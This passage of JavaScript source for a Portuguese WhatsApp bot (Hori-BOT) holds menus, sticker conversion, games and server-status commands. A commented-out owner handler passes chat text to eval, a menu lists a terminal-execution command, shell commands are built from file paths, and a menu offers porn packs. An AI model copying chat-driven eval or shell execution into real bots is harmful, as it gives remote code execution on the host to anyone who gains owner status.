┃⋆│➥ Visualizar todas as mensagens
┃⋆│💎➢ ${prefix}Kill2 ⦗🌀⦘
┃⋆│➥ Desligar o bot em pm2
┃⋆│💎➢ ${prefix}Shutdown ⦗😎⦘
┃⋆│➥ Desligar o bot em node
┃⋆│💎➢ ${prefix}Desligar ⦗💮⦘
┃⋆│➥ Desligar o bot sem pm2
┃⋆│💎➢ ${prefix}Exe ⦗🥵⦘
┃⋆│➥ Usar comandos no terminal
┃⋆│💎➢ ${prefix}Clearchat ⦗😎⦘
┃⋆│➥ Apaga todos os chats
┃⋆│💎➢ ${prefix}Listgrup ⦗💘⦘
┃⋆│➥ Listar todos os grupos
┃⋆│💎➢ ${prefix}Privado ⦗🌸⦘
┃⋆│➥ O bot fica privado, pra ngm usar
┃⋆│💎➢ ${prefix}status ⦗💻⦘
┃⋆│➥ ver informação do servidor do bot
┃⋆│💎➢ ${prefix}statusbot ⦗💻⦘
┃⋆│➥ ver informação do servidor do bot
┃⋆│💎➢ ${prefix}Publico ⦗🐷⦘
┃⋆│➥ O bot fica em público
┃⋆│💎➢ ${prefix}Upswimg ⦗🐦⦘
┃⋆│➥ Posta uma imagem nos status
┃⋆│💎➢ ${prefix}Upswvideo ⦗💖⦘
┃⋆│➥ Posta uma video nos status
┃⋆│💎➢ ${prefix}Upswtext ⦗🎗️⦘
┃⋆│➥ Posta uma texto nos status
┃⋆╰───────────────────
╰━════════════════════⊷`,
contextInfo: {mentionedJid: [sender]}}
loli.sendMessage(from, dono, text, {quoted: say1})
}

/*/if (time2 >= '19:20:00' && time2 <= '19:20:05')**{
/*loli.sendMessage(from, 'Teste 19:20:05', text)/*
}

//if (time2 >= '20:00:00' && time2 <= '20:00:01') {
/*loli.sendMessage(from, 'Boa noite😣', text)
/*buf = fs.readFileSync(`./src/boa_noite_baiano_audiosparazap.com.mp3`)
/*loli.sendMessage(from, buf, audio, {mimetype: 'audio/mp4', ptt: true})//
}

/*if(time2 < "20:15:00" && aaa == 'on'){
aaa == 'off'
loli.sendMessage(from, 'Boa noite😣', text)
} else if (time2 >= "20:15:05" && aaa == 'off'){
aaa == 'on'
}*/

/*const horatt =moment.tz('America/Sao_Paulo').format('HH:mm:ss')//
//const horaAtual = `${horatt}`
//if (horaAtual =='20:33:00' && ammOff == "off"){//
//const aMimirMp3 = fs.readFileSync('./database/audios/acorda.mp3')//
//const aMimirSt = fs.readFileSync('./database/figurinhas/sonic.webp')//
//for (let _ of groupMembers) {
//loli.sendMessage(_.jid, aMimirMp3, MessageType.audio, {mimetype: 'audio/mp4',ptt:true})//
//loli.sendMessage(_.jid, aMimirSt, sticker)
//}
//ammOff = "on"
//} elseif (horaAtual !='20:03:05' && ammOff =="on"){//
//ammOff = "off"
//}*/

/*
if (budy.startsWith('>')){
if (!isOwner) return 
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
loli.sendMessage(from, JSON.stringify(eval(body.slice(6))). text) // SO SE QUISER
} catch (err) {
m = String(err)
await reply(m)
}
}

if (budy.startsWith('#')){
if (!isOwner) return 
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
loli.sendMessage(from, JSON.stringify(eval(body.slice(6))). text) // SO SE QUISER
} catch (err) {
m = String(err)
await reply(m)
}
}*/

/*if (budy.match('sjs')) {
	adl = ` `
no = 0
for (let admon of groupAdmins) {
no += 1
adl += `[${no.toString()}] @${admon.split('@')[0]}\n`
}
mentions(adl, groupAdmins, true)
}*/

if (budy.match('teste555')) {
if (!isRegistered) return //reply(ptbr.rg(prefix, pushname))
const regin = getRegisterName(sender)
console.log('[\x1b[1;32mAUT\x1b[1;37m]', color('Auto sticker > oytr'), 'do', color(pushname), 'Em', color(groupName))
if (!isQuotedSticker) return 
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await loli.downloadAndSaveMediaMessage(encmedia)
anu = args.join(' ').split('|')
satu = anu[0] !== '' ? anu[0] : `${regin}`
// dua = typeof anu[1] !== 'undefined' ? anu[1] : ` `
// reply(ptbr.wait())
require('./lib/fetcher.js').createExif(satu)
require('./lib/fetcher.js').modStick(media, loli, mek, from)
}

if (budy.match('clear')) {
if (!isOwner) return  
console.log('[\x1b[1;32mCMD\x1b[1;37m]', color('Auto clear'), 'do', color(pushname), 'Em', color(groupName))
anu = await loli.chats.all()
list_chat = await loli.chats.all()
for (let chat of list_chat) {
loli.modifyChat(chat.jid, "delete", {includeStarred: false})
setTimeout( () => {
}, 1000)
}
}

htyt = moment.tz('America/Sao_Paulo').format('HH');
hoAtual = `${htyt}`
if(hoAtual > 00 && hoAtual < 05) {
esh = "es hora de dormir😐"
} else if(hoAtual => 05 && hoAtual < 12) {
esh = `Bom dia ${pushname}`
} else if(hoAtual => 12 && hoAtual < 18) {
esh = `Boa tarde ${pushname}`
} else if(hoAtual => 18 && hoAtual < 23) {
esh = `Boa noite ${pushname}`
}

var day = new Date();
var hor = day.getHours();
if (hor >= 0 && hor < 12) {
   const ucapanSalam = "siang";
} else if (hor == 12) {
const ucapanSalam = "Good Noon!";
} else if (hor >= 12 && hr <= 17) {
const ucapanSalam = "Good Afternoon!";
} else {
const ucapanSalam = "Good Evening!";
}

if (budy.startsWith('shhsn')){
if (!isGroup) return reply('somente no pv')
reply('teste')
}

/*if (budy.match('@559481417512')) {
sn = ["1", "2", "3"]
res = sn[Math.floor(Math.random() * sn.length)]
if (res == "1") {
var red = "hm"
} else if (res == "2") {
var red = "tzao"
} else if (res == "3") {
var red = "tatj"
} 
result = fs.readFileSync(`./database/figurinhas/` + red + `.webp`)
loli.sendMessage(from, result, sticker, {
quoted: mek
})
}
}*/

if (messagesC.includes("pq")){
//console.log('\x1b[1;37m>', '[', '\x1b[1;32mFIG\x1b[1;37m', ']', time, color("Figurinha", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
mett = ["1", "2", "3", "4"]
res = mett[Math.floor(Math.random() * mett.length)]
if (res == "1") {
result = fs.readFileSync(`./database/figurinhas/pq1.webp`)
loli.sendMessage(from, result, sticker, {quoted: mek })
} else {
mett = ["1", "2", "3", "4"]
if (res == "4") {
res = mett[Math.floor(Math.random() * mett.length)]
result = fs.readFileSync(`./database/figurinhas/pq2.webp`)
loli.sendMessage(from, result, sticker, {quoted: mek })
}
}
}

//console.log('[\x1b[1;31mFIG\x1b[1;37m]', color('Mandei uma figurinha'), 'Em', color(groupName))
//if ((budy === "botão") || (budy === "Botão")) {

/*if (budy.match('Tobi')) {
const menus = ["som1","som2"]
pingu = menus[Math.floor(Math.random() * menus.length)]
menu = fs.readFileSync('./src/'+pingu+'.mp3')
loli.sendMessage(from, menu, MessageType.audio,
})*/

/*> const audiostobi = ["menuzin","gunters"]
pingu = menus[Math.floor(Math.random() * menus.length)]
audiostobi = fs.readFileSync('./database/'menuzin'.mp3')
loli.sendMessage(from, menu, MessageType.audio)

> const menus = ["menuzin","gunters"]
pingu = menus[Math.floor(Math.random() * menus.length)]
menus = fs.readFileSync(`./src/som` + pingu + `.mp3`)
loli.sendMessage(from, menu, MessageType.audio,
*/
switch(testea) {
/*case 'pq': case 'Pq': case 'PQ':
mett = ["1", "2"]
res = mett[Math.floor(Math.random() * mett.length)]
if (res == "1") {
result = fs.readFileSync(`./database/figurinhas/pq` + res + `.webp`)
loli.sendMessage(from, result, sticker, {
quoted: mek
})
}
break*/

case '1':
mett = ["1", "2"]
res = mett[Math.floor(Math.random() * mett.length)]
if (res == "1") {
result = fs.readFileSync(`./src/aqua.webp`)
loli.sendMessage(from, result, sticker, {
quoted: mek
})
}
break

case 'indefinido6e7261':
mett = ["1", "2"]
res = mett[Math.floor(Math.random() * mett.length)]
if (res == "1") {
result = fs.readFileSync(`./src/ai.webp`)
loli.sendMessage(from, result, sticker, {
quoted: mek
})
reply('Chassi de griloKKKKKKKKKKKKKKKKKKKKKKKK')
} else if (res == "2") {
mett = ["1", "2", "3", "4"]
res = mett[Math.floor(Math.random() * mett.length)]
result = fs.readFileSync(`./database/figurinhas/pq` + res + `.webp`)
loli.sendMessage(from, result, sticker, {
quoted: mek
})
reply('"teste')
}
}

/*case '@559481417512':
sn = ["1", "2", "3"]
res = sn[Math.floor(Math.random() * sn.length)]
if (res == "1") {
result = fs.readFileSync(`./database/audios/chann.mp2`)
loli.sendMessage(from, result, audio, {
mimetype: 'audio/mp4',
quoted: mek,
ptt: true
})
if (res == "2") {
reply('Esse baiano deve estar dormindo...')
} else if (res == "3") {
sn = ["1", "2"]
res = sn[Math.floor(Math.random() * sn.length)]
if (res == "1") {
var red = "hm"
} else if (res == "2") {
var red = "tzao"
}
result = fs.readFileSync(`./database/figurinhas/` + red + `.webp`)
loli.sendMessage(from, result, sticker, {
quoted: mek
})
}
}

case 'teste':
mett = ["1", "2", "3"]
res = mett[Math.floor(Math.random() * mett.length)]
result = fs.readFileSync(`./src/som` + res + `.mp3`)
loli.sendMessage(from, result, audio, {mimetype: 'audio/mp4', quoted: mek, ptt: true})
}*/

//victor.sendMessage(from, buf, audio, {mimetype: 'audio/mp4', quoted: mek, ptt: true})

/*=========================================================================*/

/*=========================================================================*/

switch(testat) {

//_ TESTES

case 'help':
case 'Help':
case 'menu':
case 'Menu':
textmenu = `        ╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╾
oi ${pushname} use ${prefix}menu caso queira usar meus comandos🧙‍♂️
        ╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾╾`
reply(textmenu)
break
}
             
//_COMANDOS
switch(command) {
//_MENU
case 'help': 
case 'ajuda':
case 'comandos':
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
addFilter(from)
menus = ["1", "2", "3"]
res = menus[Math.floor(Math.random() * menus.length)]
const useLevel = getLevelingLevel(sender)
const useXp = getLevelingXp(sender)
const useTime = getRegisterTime(sender) 
const requireXp = 20 * Math.pow(useLevel, 2) + 150 * useLevel + 1000
if (useLevel === undefined && chec === undefined) addLevelingId(sender)
const checATM = checkATMuser(sender)
const chatss = `${totalchat.length}`
const comandost = totalcmd
// let batanu = global.batrei[global.batrei.length - 1]
result = fs.readFileSync(`./database/audios/menu` + res + `.mp3`)
loli.sendMessage(from, result, audio, {mimetype: 'audio/mp4', quoted: mek, ptt: true})
const horib = ["hori1","hori2","hori3","hori4","hori5"]
hori23 = horib[Math.floor(Math.random() * (horib.length))]	
const hori2 = fs.readFileSync('./src/hori/'+hori23+'.mp4')
loli.sendMessage(from, hori2,  MessageType.video, {mimetype: 'video/gif', quoted: say1, caption: help(bateria, pushname, prefix, hr, chatss, ucapanFakereply, prema, checATM, useLevel, requireXp, useXp, patt) })
// costum(help(bateria, pushname, prefix, hr, chatss, ucapanFakereply, prema, checATM, useLevel, requireXp, useXp, patt), text, tescuk, cr)
if(useLevel == undefined && useXp == undefined){
}
break

/*-------------[ Tictactoe Handler ]-------------*/

                case 'jogodavelha':
					         addFilter(from)
					if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
						if(!isGroup) return reply('comando apenas para grupos')
                    if (fs.existsSync(`./lib/tictactoe/db/${from}.json`)) {
                         const boardnow = setGame(`${from}`);
                         const matrix = boardnow._matrix;
                         const chatMove = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
     
     [❗] Alguem está jogando no momento...\n\n@${boardnow.X} VS @${boardnow.O}
     
     ❌ : @${boardnow.X}
     ⭕ : @${boardnow.O}
     
     Sua vez : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}
     
     
          ${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
          ${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
          ${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
     
     
     `;
                         loli.sendMessage(from, chatMove, MessageType.text, {
                              quoted: mek,
                              contextInfo: {
                                   mentionedJid: [
                                        boardnow.X + "@s.whatsapp.net",
                                        boardnow.O + "@s.whatsapp.net",
                                   ],
                              },
                         });
                         return;
                    }
                    if (argss.length === 1)
                         return reply(
                              `*⟅❗⟆ Jogue com Alguem!!!!*
*para inicar a partida : ${prefix}${command} @membro do gp*`
                         );
                    const boardnow = setGame(`${from}`);
                    console.log(`Start Tictactore ${boardnow.session}`);
                    boardnow.status = false;
                    boardnow.X = sender.replace("@s.whatsapp.net", "");
                    boardnow.O = argss[1].replace("@", "");
                    fs.writeFileSync(
                         `./lib/tictactoe/db/${from}.json`,
                         JSON.stringify(boardnow, null, 2)
                    );
                    const strChat = `*『📌ᎬՏᏢᎬᎡᎪΝᎠϴ ϴ ϴᏢϴΝᎬΝͲᎬ⚔️』*
     
     @${sender.replace(
                         "@s.whatsapp.net",
                         ""
                    )} _está te desafiando para uma partida de jogo da velha..._
     
     _[ ${argss[1]} ] Use *『S』* para aceitar ou *『N』* para não aceitar..._
     `;
                    loli.sendMessage(from, strChat, MessageType.text, {
                         quoted: mek,
                         contextInfo: {
                              mentionedJid: [sender, argss[1].replace("@", "") + "@s.whatsapp.net"],
                         },
                    });
                    break
                      case  'resetavelha':
                      addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroupAdmins) return reply(mess.only.admin)
                    if (fs.existsSync("./lib/tictactoe/db/" + from + ".json")) {
                         fs.unlinkSync("./lib/tictactoe/db/" + from + ".json");
                         reply(`Jogo da velha resetado com sucesso nesse grupo!`);
                    } else {
                         reply(`Não a nenhuma sessão em andamento...`);
                    }
                    break

case 'level':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isLevelingOn) return reply(ptbr.levelnoton())
const userLevel = getLevelingLevel(sender)
const userXp = getLevelingXp(sender)
const userTime = getRegisterTime(sender)
if (userLevel === undefined && userXp === undefined) return reply(ptbr.levelnol())
const requiredXp = 5 * Math.pow(userLevel, (5 / 2)) + 50 * userLevel + 100
const getLevel = getLevelingLevel(sender)
/*============================================================*/
const levelgif = fs.readFileSync('./src/levelup.mp4')
loli.sendMessage(from,  levelgif,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: leveltab(pushname, userLevel, userXp, patt, getLevel) })
break

case 'bateria': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
batter =`
┬────────────┈ ⳹
┌┤「 ｂａｔｅｒｉａ 」
││
││🔋 : ${bateria}%
││          └${porcentagem}
│├────────
││_SISTEMA DE BATERIA_
│└────────
│Copyright © zadik/Hori-BOT 2022
╰─━━━─── • ───━━━❋ཻུ۪۪⸙`
loli.sendMessage(from, batter, text, {quoted: mek})
break

case 'info-bot':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
var groups = loli.chats.array.filter(v => v.jid.endsWith('g.us'))
var privat = loli.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
let batans = global.batrei[global.batrei.length - 1]
let timestamp3 = speed();
let latensi4 = speed() - timestamp3
uptime = process.uptime();

totalChat = await loli.chats.all()
charge = charging ? 'sim' : 'não'
listrik = charging ? '⚡' : 'ga di cas'
	teks = `❏ ESTATÍSTICAS DO CELULAR:
├ Uso de Ram : ${ram2}
├ Tempo de atividade : ${temporizador(uptime)}
├ Versão do Wa: ${loli.user.phone.wa_version}
└ Modelo do dispositivo: ${loli.user.phone.device_model}

❏ ESTATÍSTICAS DO BOT:
├ Carga da bateria: ${batans}%
├ Total de grupos : ${groups.length}
├ Total de usuários no pv do bot : ${privat.length}
├ Total de chats : ${totalChat.length}
├ Velocidade : ${latensi4.toFixed(4)} Second
└ Ativo desde : ${temporizador(uptime)}`
reply(`${teks}`)
break

case 'status':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return reply('Este comando e so pro meu criador')
var groups = loli.chats.array.filter(v => v.jid.endsWith('g.us'))
var privat = loli.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
let timestamp1 = speed();
let latensi5 = speed() - timestamp1
uptime = process.uptime();

totalChat = await loli.chats.all()
charge = charging ? 'sim' : 'não'
listrik = charging ? '⚡' : 'ga di cas'
teks = `
き⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❗ informações do bot❗⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟き
き⃟👷‍♀️ Velocidade : *${latensi5.toFixed(4)} segundos*
き⃟👷‍♀️ Tempo ativo : *${temporizador(uptime)}*
き⃟👷‍♀️ Total de chats : *${totalChat.length}*
き⃟👷‍♀️ Total de grupos : *${groups.length}*
き⃟👮‍♀️ Total de pessoas no pv : *${privat.length}*
き⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟📱 informações do celular📱⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟き
き⃟🐃 Bateria : *${baterai}*
き⃟🐃 Carregando : *${charge}*
き⃟🐃 Versão do whatsapp : *${loli.user.phone.wa_version}*
き⃟🐃 Modelo do dispositivo : *${loli.user.phone.device_model}*
き⃟🐃 Versão do celular : *${loli.user.phone.os_version}*
き⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟💻 informações do servidor💻⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟き
き⃟🟢 Uso da ram : *${ram2}*
き⃟🟢 Plataforma : *${os.platform()}*
き⃟🟢 Nome do host : *${os.hostname()}*
き⃟🟢 Tempo de atividade : *${temporizador(os.uptime())}* `

wew = fs.readFileSync('./src/hori/hori1.mp4')
loli.sendMessage(from, wew, video, {quoted: horiloc, mimetype: Mimetype.gif, thumbnail:null, caption: `${teks}`})
break

                case 'statusbot':
  if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
 if (!isOwner) return reply('Este comando e so pro meu criador')     
                let neww = performance.now()
                let oldd = performance.now()
                 let timestamp2 = speed()
                 let latensi3 = speed() - timestamp2
                respon = `
き⃟🟢 Velocidade de Resposta ${latensi3.toFixed(4)} Segundos \n ${oldd - neww} milissegundos\n\nTempo de execução : ${runtime(process.uptime())}
き⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟💻 informações do servidor💻⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟き
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
Uso de memória NodeJS
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
${cpus[0] ? `Uso total da CPU
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- ${(type + '').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
CPU Core(s) Usage (${cpus.length} Core CPU)
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- ${(type + '').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                wew = fs.readFileSync('./src/servergif.mp4')
loli.sendMessage(from, wew, video, {quoted: horiloc, mimetype: Mimetype.gif, thumbnail:null, caption: `${respon}`})
            break

case 'menu2':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const menugif = fs.readFileSync('./src/menu2gif.mp4')
const chatts1 = `${totalchat.length}`
loli.sendMessage(from, menugif,  MessageType.video, {mimetype: 'video/gif', quoted: say1, caption: `

╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│Olá @${sender.split('@')[0]}!!
┃⋆├───────────────────
┃⋆│⬩ 𝗂𝗇𝖿𝗈𝗋𝗆𝖺𝖼̧𝗈̃𝖾𝗌 𝖽𝗈 𝖻𝗈𝗍
┃⋆│⪧ Nome ${pushname} ⟨💎⟩
┃⋆│⪧ prefix: ⟨ ${prefix} ⟩ ⟨❗⟩            
┃⋆│⪧ Bateria: ${bateria} ⟨🔋⟩               
┃⋆│⪧ Horário: ${hr} ⟨⏰⟩                       
┃⋆│⪧ Chats ${chatts1} ⟨🏓⟩
┃⋆╰───────────────────
╰━════════════════════⊷
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ 𝙼𝚎n𝚞 𝚍𝚎 𝚏𝚒𝚐𝚞𝚛𝚒𝚗𝚑𝚊𝚜
┃⋆│💎➢ ${prefix}animefig ⟨📄⟩
┃⋆│➥ manda fig de anime random
┃⋆│💎➢ ${prefix}animegif ⟨📄⟩
┃⋆│➥ manda fig animada
┃⋆│💎➢ ${prefix}circulo ⟨📄⟩
┃⋆│➥ manda fig redonda 
┃⋆│💎➢ ${prefix}St ⟨🔧⟩
┃⋆│➥ Corta uma imagem para sticker
┃⋆│  para uma menor resolução
┃⋆│💎➢ ${prefix}stickerwm ⟨📄⟩
┃⋆│➥ fazer fig com seu nome
┃⋆│💎➢ ${prefix}figu ⟨🔧⟩
┃⋆│➥ Corta uma imagem para sticker
┃⋆│💎➢ ${prefix}Sticker ⟨📄⟩
┃⋆│➥ Faz um sticker com foto/video
┃⋆│💎➢ ${prefix}Stiker nobg ⟨📄⟩
┃⋆│➥ Faz um sticker sem fundo(png)
┃⋆│💎➢ ${prefix}Toimg ⟨📄⟩
┃⋆│➥ Converte sticker em foto
┃⋆│💎➢ ${prefix}Togif ⟨📄⟩
┃⋆│➥ Converte sticker em gif
┃⋆│💎➢ ${prefix}Tourl ⟨📄⟩
┃⋆│➥ Converte imagem em URL
┃⋆│💎➢ ${prefix}Tomp3 ⟨🌀⟩
┃⋆│➥ Converte video em audio
┃⋆│💎➢ ${prefix}Ttp ⟨🥳⟩
┃⋆│➥ Faz sticker de letras paradas
┃⋆│💎➢ ${prefix}ytmp4 ⟨🐧⟩ [OFF]
┃⋆│➥ Baixa um vídeo do youtube
┃⋆│💎➢ ${prefix}playmp4 ⟨🐧⟩
┃⋆│➥ Baixa um vídeo do youtube
┃⋆│💎➢ ${prefix}Packs ⟨👿⟩ 𝗩𝗜𝗣
┃⋆│➥ Packs de porno.
┃⋆│💎➢ ${prefix}Fotos ⟨👿⟩  𝗩𝗜𝗣
┃⋆│➥ Pack de fotos
┃⋆│💎➢ ${prefix}Attp ⟨Texto⟩ ⟨🌸⟩
┃⋆│➥ Faz sticker animado
┃⋆│💎➢ ${prefix}Attp1 ⟨Texto⟩ ⟨🔥⟩ 𝗩𝗜𝗣
┃⋆│➥ Faz sticker animado
┃⋆│💎➢ ${prefix}Attp2 ⟨Texto⟩ ⟨💮⟩ 𝗩𝗜𝗣
┃⋆│➥ Faz sticker animado
┃⋆│💎➢ ${prefix}Attp3 ⟨Texto⟩ ⟨🌀⟩ 𝗩𝗜𝗣
┃⋆│➥ Faz sticker animado
┃⋆│💎➢ ${prefix}Attp4 ⟨Texto⟩ ⟨🌟⟩ 𝗩𝗜𝗣
┃⋆│➥ Faz sticker animado
┃⋆│💎➢ ${prefix}Attp5 ⟨Texto⟩ ⟨👻⟩ 𝗩𝗜𝗣
┃⋆│➥ Faz sticker animado
┃⋆│💎➢ ${prefix}Attp6 ⟨Texto⟩ ⟨☔⟩ 𝗩𝗜𝗣
┃⋆│➥ Faz sticker animado
┃⋆│ Attp 1,2,3,4,5,6 varia o tipo de letra.
┃⋆│  As vezes estão off, então não vai!
┃⋆│💎➢ ${prefix}Play ⟨🎵⟩
┃⋆│➥ Fazer download de uma musica
┃⋆│💎➢ ${prefix}Play1 ⟨🎵⟩
┃⋆│➥ Fazer download de uma musica
┃⋆│💎➢ ${prefix}Play2 ⟨🎵⟩
┃⋆│➥ Fazer download de uma musica
┃⋆│💎➢ ${prefix}Play3 ⟨🎵⟩
┃⋆│➥ Fazer download de uma musica
┃⋆│💎➢ ${prefix}Play4 ⟨🎵⟩
┃⋆│➥ Fazer download de uma musica
┃⋆│💎➢ ${prefix}Tts pt ⟨Texto⟩ ⟨☔⟩
┃⋆│➥ Voz do google em vários idioma
┃⋆│💎➢ ${prefix}Wame ⟨‍✈️⟩
┃⋆│➥ Seu wa.me 
┃⋆│💎➢ ${prefix}Ocr ⟨🔞⟩
┃⋆│➥ Retirar texto de uma foto
┃⋆│💎➢ ${prefix}Cep ⟨🌸⟩
┃⋆│➥ Mostra a pesquisa sobre o cep
┃⋆│💎➢ ${prefix}Contar ⟨💫⟩
┃⋆│➥ Contar as caracteres
┃⋆│💎➢ ${prefix}Google ⟨💖⟩
┃⋆│➥ Pesquise sobre algo
┃⋆│💎➢ ${prefix}nome ⟨👨‍🚀⟩
┃⋆│➥ procura o nome do anime
┃⋆│
┃⋆╰───────────────────
╰━════════════════════⊷`})
break

case 'st': //Menu2
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await loli.downloadAndSaveMediaMessage(encmedia)
rano = getRandom('.webp')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function(cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function(err) {
console.log(`Error : ${err}`)
reply(mess.wait)
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(media)
exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
buffer = fs.readFileSync(rano)
loli.sendMessage(from, buffer, sticker, {
quoted: mek
})
fs.unlinkSync(rano)
})
})
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await loli.downloadAndSaveMediaMessage(encmedia)
rano = getRandom('.webp')
reply(mess.wait)
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function(cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function(err) {
console.log(`Error : ${err}`)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`Falha na conversão de ${tipe} para sticker`)
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(media)
exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
buffer = fs.readFileSync(rano)
loli.sendMessage(from, buffer, sticker, {
quoted: mek
})
fs.unlinkSync(rano)
})
})
} else {
reply(`Você precisa enviar ou marcar uma imagem ou vídeo com no máximo 10 segundos`)
}
break

case 'stiker':
case 'stickergif':
case 'stikergif':
case 'gif':
case 'figurinha':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await loli.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
reply(ptbr.wait())
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(ptbr.stick())
})
.on('end', function () {
console.log('Figurinha feita 🎉')
exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${ran} -o ${ran}`, async (error) => {
if (error) return reply(ptbr.stick())
loli.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
fs.unlinkSync(media)	
fs.unlinkSync(ran)	
 })
 })
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`, `scale='min(180,iw)':min'(180,ih)':force_original_aspect_ratio=decrease,fps=20, pad=180:180:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await loli.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
reply(ptbr.wait())
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
